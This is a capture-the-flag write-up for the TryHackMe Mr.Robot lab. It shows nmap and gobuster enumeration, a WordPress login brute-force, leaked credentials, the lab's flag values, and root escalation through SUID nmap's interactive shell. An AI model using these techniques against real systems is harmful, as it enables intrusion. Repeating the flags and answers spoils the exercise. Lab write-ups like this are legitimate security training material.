# TryHackMe Mr.Robot Writeup

## nmap scan

```
nmap -sV -vv --script vuln 10.10.208.76
```

```java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 07:52 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 07:52
Completed NSE at 07:52, 10.12s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 07:52
Completed NSE at 07:52, 0.00s elapsed
Initiating Ping Scan at 07:52
Scanning 10.10.208.76 [4 ports]
Completed Ping Scan at 07:52, 0.42s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:52
Completed Parallel DNS resolution of 1 host. at 07:52, 0.16s elapsed
Initiating SYN Stealth Scan at 07:52
Scanning 10.10.208.76 [1000 ports]
Discovered open port 80/tcp on 10.10.208.76
Discovered open port 443/tcp on 10.10.208.76
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 55.75% done; ETC: 07:53 (0:00:21 remaining)
Completed SYN Stealth Scan at 07:52, 38.24s elapsed (1000 total ports)
Initiating Service scan at 07:52
Scanning 2 services on 10.10.208.76
Completed Service scan at 07:53, 13.03s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.208.76.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 07:53
NSE Timing: About 93.68% done; ETC: 07:53 (0:00:02 remaining)
NSE Timing: About 98.25% done; ETC: 07:54 (0:00:01 remaining)
NSE Timing: About 98.95% done; ETC: 07:54 (0:00:01 remaining)
NSE Timing: About 99.30% done; ETC: 07:55 (0:00:01 remaining)
NSE Timing: About 99.30% done; ETC: 07:55 (0:00:01 remaining)
Completed NSE at 07:55, 163.03s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 07:55
Completed NSE at 07:56, 16.08s elapsed
Nmap scan report for 10.10.208.76
Host is up, received echo-reply ttl 63 (0.19s latency).
Scanned at 2025-03-18 07:52:19 EDT for 232s
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 63
80/tcp  open   http     syn-ack ttl 63 Apache httpd
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.208.76
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.208.76:80/js/BASE_URL
|     Form id: 
|     Form action: http://10.10.208.76/
|     
|     Path: http://10.10.208.76:80/js/BASE_URL
|     Form id: 
|     Form action: http://10.10.208.76/
|     
|     Path: http://10.10.208.76:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://10.10.208.76/
|     
|     Path: http://10.10.208.76:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://10.10.208.76/
|     
|     Path: http://10.10.208.76:80/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|     Form action: http://10.10.208.76/
|     
|     Path: http://10.10.208.76:80/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|     Form action: http://10.10.208.76/
|     
|     Path: http://10.10.208.76:80/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: http://10.10.208.76/
|     
|     Path: http://10.10.208.76:80/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: http://10.10.208.76/
|     
|     Path: http://10.10.208.76:80/wp-login.php
|     Form id: loginform
|_    Form action: http://10.10.208.76/wp-login.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
443/tcp open   ssl/http syn-ack ttl 63 Apache httpd
|_http-server-header: Apache
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.208.76
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: https://10.10.208.76:443/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: https://10.10.208.76:443/
|     
|     Path: https://10.10.208.76:443/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: https://10.10.208.76:443/
|     
|     Path: https://10.10.208.76:443/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|     Form action: https://10.10.208.76:443/
|     
|     Path: https://10.10.208.76:443/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|     Form action: https://10.10.208.76:443/
|     
|     Path: https://10.10.208.76:443/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: https://10.10.208.76:443/
|     
|     Path: https://10.10.208.76:443/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: https://10.10.208.76:443/
|     
|     Path: https://10.10.208.76:443/js/BASE_URL
|     Form id: 
|     Form action: https://10.10.208.76:443/
|     
|     Path: https://10.10.208.76:443/js/BASE_URL
|     Form id: 
|     Form action: https://10.10.208.76:443/
|     
|     Path: https://10.10.208.76:443/wp-login.php
|     Form id: loginform
|_    Form action: https://10.10.208.76:443/wp-login.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 07:56
Completed NSE at 07:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 07:56
Completed NSE at 07:56, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 244.47 seconds
           Raw packets sent: 2021 (88.900KB) | Rcvd: 24 (956B)
                                                      
```

![image](https://github.com/user-attachments/assets/ed501f05-1c56-41fe-b5db-f6b132f01ea3)

## ``gobuster``

```
gobuster dir -u http://10.10.195.194/ -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.195.194/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.195.194/images/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.195.194/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.195.194/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.195.194/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.195.194/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.195.194/feed/]
/video                (Status: 301) [Size: 235] [--> http://10.10.195.194/video/]
/image                (Status: 301) [Size: 0] [--> http://10.10.195.194/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.195.194/feed/atom/]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.195.194/wp-content/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.195.194/admin/]
/audio                (Status: 301) [Size: 235] [--> http://10.10.195.194/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2613]
/css                  (Status: 301) [Size: 233] [--> http://10.10.195.194/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.195.194/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.195.194/wp-includes/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.195.194/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.195.194/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.195.194/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.195.194/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.195.194/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://10.10.195.194/]
Progress: 5014 / 220561 (2.27%)[ERROR] Get "http://10.10.195.194/kudos": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 5629 / 220561 (2.55%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 5634 / 220561 (2.55%)
===============================================================
Finished
===============================================================
```

```
https://10.10.195.194/robots
```

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

---

```
https://10.10.195.194/key-1-of-3.txt
```

```
073403c8a58a1f80d943455fb30724b9
```

---

```
https://10.10.195.194/fsocity.dic
```

![image](https://github.com/user-attachments/assets/b3ab514a-49a8-4a0d-afa5-ab57c635d085)

i notice that if i enter wrong usernanme page say ``invalid suername`` but when doing brute force if username valid it say ``The password you entered for the username``

![image](https://github.com/user-attachments/assets/262b08ef-57fb-427e-a15a-4cdc7285a6c4)

![image](https://github.com/user-attachments/assets/55773854-ef9e-4c9a-a118-35a0c595964e)

so username is: 

```
Elliot
```

now do the same brute force but on passowrd

![image](https://github.com/user-attachments/assets/ebb70d54-f68f-4867-8b56-2712a643e06b)

so the password is:

```
ER28-0652
```

* <details>
      <summary>another way🟪</summary>   

    ```
    https://10.10.125.174/license
    ```

    ![image](https://github.com/user-attachments/assets/5697ac35-bdca-4d79-9642-f8411a9f76f0)

   ```
   ZWxsaW90OkVSMjgtMDY1Mgo=
   ```

   ```
   elliot:ER28-0652
   ```

           
</details>

![image](https://github.com/user-attachments/assets/33477ee5-992b-430c-ac61-ed4bcd45e847)

```
https://10.10.125.174/404.php
```

![image](https://github.com/user-attachments/assets/aeb9059c-f6d1-4f3e-ac97-d935e46433e3)

---
---
---

![image](https://github.com/user-attachments/assets/40f5a23a-42ef-4156-86ee-3ce9d580a844)

```
c3fcd3d76192e4007dfb496cca67e13b
```

```
abcdefghijklmnopqrstuvwxyz
```

change user to ``robot``

![image](https://github.com/user-attachments/assets/4527dee4-4773-4210-8ca6-5253c1ca4405)

find all files that work with ``suid/sgid``:

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

```
-rwsr-xr-x 1 root root 39144 Apr  9  2024 /bin/umount
-rwsr-xr-x 1 root root 55528 Apr  9  2024 /bin/mount
-rwsr-xr-x 1 root root 67816 Apr  9  2024 /bin/su
-rwxr-sr-x 3 root mail 14344 Sep  3  2018 /usr/bin/mail-touchlock
-rwsr-xr-x 1 root root 68208 Feb  6  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root 44784 Feb  6  2024 /usr/bin/newgrp
-rwxr-sr-x 3 root mail 14344 Sep  3  2018 /usr/bin/mail-unlock
-rwxr-sr-x 3 root mail 14344 Sep  3  2018 /usr/bin/mail-lock
-rwsr-xr-x 1 root root 53040 Feb  6  2024 /usr/bin/chsh
-rwxr-sr-x 1 root crontab 43720 Feb 13  2020 /usr/bin/crontab
-rwsr-xr-x 1 root root 85064 Feb  6  2024 /usr/bin/chfn
-rwxr-sr-x 1 root shadow 84512 Feb  6  2024 /usr/bin/chage
-rwsr-xr-x 1 root root 88464 Feb  6  2024 /usr/bin/gpasswd
-rwxr-sr-x 1 root shadow 31312 Feb  6  2024 /usr/bin/expiry
-rwxr-sr-x 1 root mail 22680 Oct 11  2019 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
-rwxr-sr-x 1 root ssh 350504 Apr 11 12:16 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 17272 Jun  2 18:23 /usr/local/bin/nmap       <<<------------⚠️
-rwxr-sr-x 1 root utmp 14648 Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-xr-x 1 root root 477672 Apr 11 12:16 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwxr-sr-x 1 root shadow 43160 Jan 10  2024 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 43168 Jan 10  2024 /sbin/pam_extrausers_chkpwd
```

> in hint say it in nmap

in old versions of ``nmap`` if you use:

```
/usr/local/bin/nmap --interactive
```

it will open interacitve shell you can get root form it :

```
!sh
```

![image](https://github.com/user-attachments/assets/a852996f-cf24-44d0-968a-eee43e4712bc)

* <details>
      <summary>preivillage esc using linpeas 🟪🟧✅ (didn't try all this ways)</summary>     

     1- bash version is too old

     ![image](https://github.com/user-attachments/assets/4f36cea1-1727-4694-8731-772a4195eee1)

     so we can use this ``CVE`` TO DO prevESC

     ![image](https://github.com/user-attachments/assets/e97ba4d1-4bbc-422f-9bb0-dda31340843c)
   

     as we do in ``cat picters_2`` CTF YOU can go to there to see all steps [here](https://github.com/Frankishtien/writeups-reports/blob/main/Cat%20Pictures%202.md)

     2- ![image](https://github.com/user-attachments/assets/e1ecf09c-827e-4d93-b5ca-084fcb295a2a)

     3- you can read ssh-key for root

      ![image](https://github.com/user-attachments/assets/e76bee45-5b71-4bf0-8ef3-52664dec0ff9)

     4- using ``nmap``

      ![image](https://github.com/user-attachments/assets/af4bbfa7-608f-4451-aba0-304b64945074)

     5- ![image](https://github.com/user-attachments/assets/95f3856e-556f-4d19-aaa2-80010260374d)

     6- writeable ``/etc/passwd``

       ![image](https://github.com/user-attachments/assets/97fbd15f-113f-43d5-9dbc-9427491856d1)

     7- 

     
              
</details>

